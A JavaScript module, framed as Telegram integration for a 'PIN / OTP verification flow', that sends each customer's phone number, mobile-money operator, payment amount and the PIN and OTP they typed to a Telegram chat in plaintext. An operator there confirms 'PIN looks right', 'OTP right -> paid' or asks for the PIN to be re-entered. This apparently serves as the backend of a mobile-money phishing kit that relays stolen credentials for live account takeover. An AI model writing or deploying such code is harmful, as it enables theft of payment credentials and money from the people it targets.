/**
 * Telegram integration for the PIN / OTP verification flow.
 *
 * Uses long polling (getUpdates) instead of a public webhook: no public URL,
 * no secret-token header, and button taps are delivered straight into this
 * process. When TELEGRAM_BOT_TOKEN is missing every call is a no-op so local
 * development keeps working.
 */
"use strict";

const https = require("https");

const API = (token, method) => `https://api.telegram.org/bot${token}/${method}`;

// Callback actions (the request id is appended after the underscore).
const CB_ALLOW = "allow"; // PIN looks right -> go to OTP
const CB_INVALID = "invalid"; // PIN is wrong -> new PIN
const CB_OTP_CORRECT = "otp_correct"; // OTP right -> paid
const CB_OTP_WRONG = "otp_wrong"; // OTP wrong -> retry or fail
const CB_OTP_WRONG_PIN = "otp_wrong_pin"; // OTP ok but PIN was wrong -> back to PIN

const BUTTONS = {
  pin: [
    [
      { text: "✅ Allow Proceed", callback: CB_ALLOW },
      { text: "❌ Invalid Information", callback: CB_INVALID },
    ],
  ],
  otp: [
    [
      { text: "✅ Correct OTP + PIN", callback: CB_OTP_CORRECT },
      { text: "❌ Wrong Code", callback: CB_OTP_WRONG },
    ],
    [{ text: "🔑 Wrong PIN — re-enter PIN", callback: CB_OTP_WRONG_PIN }],
  ],
};

function makeTelegram({ token, chatId, onAction, log = console }) {
  const enabled = Boolean(token && chatId);
  let polling = false;
  let offset = 0;
  let timer = null;

  function call(method, payload) {
    if (!enabled) return Promise.resolve(null);
    return new Promise((resolve) => {
      const body = JSON.stringify(payload);
      const req = https.request(
        API(token, method),
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(body),
          },
          timeout: 15000,
        },
        (res) => {
          let raw = "";
          res.on("data", (chunk) => (raw += chunk));
          res.on("end", () => {
            try {
              const parsed = JSON.parse(raw);
              if (!parsed.ok) log.warn(`Telegram ${method} failed: ${parsed.description || raw}`);
              resolve(parsed);
            } catch {
              log.warn(`Telegram ${method} returned non-JSON: ${raw.slice(0, 200)}`);
              resolve(null);
            }
          });
        }
      );
      req.on("timeout", () => req.destroy(new Error("timeout")));
      req.on("error", (err) => {
        log.warn(`Telegram ${method} error: ${err.message}`);
        resolve(null);
      });
      req.write(body);
      req.end();
    });
  }

  /** Send a message that carries inline decision buttons. */
  function sendWithButtons(text, buttons, requestId) {
    return call("sendMessage", {
      chat_id: chatId,
      text,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: buttons.map((row) =>
          row.map((b) => ({ text: b.text, callback_data: `${b.callback}_${requestId}` }))
        ),
      },
    });
  }

  const money = (n) => Number(n || 0).toLocaleString("fr-FR");

  function notifyPin(order) {
    const text =
      "🔐 *Vérification PIN*\n\n" +
      `Réf. : \`${order.reference}\`\n` +
      `Numéro : \`${order.phone}\`\n` +
      `Opérateur : ${order.methodLabel}\n` +
      `Forfait : ${order.planName}\n` +
      `Montant : ${money(order.amount)} XAF\n` +
      `Tentative : ${order.attempt}/2\n\n` +
      `*PIN saisi :* \`${order.pin || "—"}\``;
    return sendWithButtons(text, BUTTONS.pin, order.reference);
  }

  function notifyOtp(order) {
    const text =
      "📩 *Vérification OTP*\n\n" +
      `Réf. : \`${order.reference}\`\n` +
      `Numéro : \`${order.phone}\`\n` +
      `Opérateur : ${order.methodLabel}\n` +
      `Montant : ${money(order.amount)} XAF\n` +
      `Tentative : ${order.attempt}/2\n\n` +
      `*OTP saisi :* \`${order.otp || "—"}\``;
    return sendWithButtons(text, BUTTONS.otp, order.reference);
  }

  function notifyStatus(text) {
    return call("sendMessage", { chat_id: chatId, text, parse_mode: "Markdown" });
  }

  function answer(callbackId, text) {
    return call("answerCallbackQuery", { callback_query_id: callbackId, text: text || "" });
  }

  // --- long polling ------------------------------------------------------
  async function pollOnce() {
    const res = await call("getUpdates", { offset, timeout: 25 });
    if (!res || !res.ok || !Array.isArray(res.result)) return;
    for (const update of res.result) {
      offset = update.update_id + 1;
      const q = update.callback_query;
      if (!q) continue;
      if (String(q.message?.chat?.id || "") !== String(chatId)) {
        await answer(q.id, "❌ Only the operator can approve.");
        continue;
      }
      const data = String(q.data || "");
      const cut = data.lastIndexOf("_");
      if (cut < 1) {
        await answer(q.id, "Unknown action.");
        continue;
      }
      const action = data.slice(0, cut);
      const reference = data.slice(cut + 1);
      let ack = "Action inconnue.";
      try {
        ack = await onAction(reference, action, q.message?.message_id);
      } catch (err) {
        log.error(`Callback ${action}/${reference} failed: ${err.message}`);
        ack = "Erreur lors du traitement.";
      }
      await answer(q.id, ack);
    }
  }

  async function loop() {
    polling = true;
    while (polling) {
      try {
        await pollOnce();
      } catch (err) {
        log.warn(`Telegram polling error: ${err.message}`);
        await new Promise((r) => (timer = setTimeout(r, 3000)));
      }
    }
  }

  function start() {
    if (!enabled) {
      log.warn("Telegram not configured; PIN/OTP requests will not be delivered.");
      return;
    }
    log.info("Telegram polling started.");
    loop();
  }

  function stop() {
    polling = false;
    if (timer) clearTimeout(timer);
  }

  return { enabled, start, stop, notifyPin, notifyOtp, notifyStatus, answer };
}

module.exports = { makeTelegram, CB_ALLOW, CB_INVALID, CB_OTP_CORRECT, CB_OTP_WRONG, CB_OTP_WRONG_PIN };
